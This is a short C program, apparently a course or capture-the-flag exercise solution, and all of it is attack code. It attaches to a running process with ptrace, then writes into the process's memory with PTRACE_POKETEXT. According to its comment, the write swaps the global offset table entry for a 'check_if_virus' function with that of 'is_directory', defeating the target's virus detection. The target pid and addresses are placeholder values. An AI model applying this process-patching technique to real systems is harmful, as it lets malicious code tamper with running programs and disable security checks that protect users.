#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int pid = 0x12345678;
int CHECK_IF_VIRUS_GOT = 0x12345678;
int CHECK_IF_VIRUS_ALTER = 0x12345678;
int main() {
    

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1){
        perror("attach");
        return -1;
    }

    int status;
    waitpid(pid, &status, 0);

    if (WIFEXITED(status)){
        return -1;
    }
    
    ptrace(PTRACE_POKETEXT, pid, CHECK_IF_VIRUS_GOT, CHECK_IF_VIRUS_ALTER); //change check_if_virus got entry to is_directory got entry

    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1){
        perror("detach");
        return -1;
    }
    return 0;
}
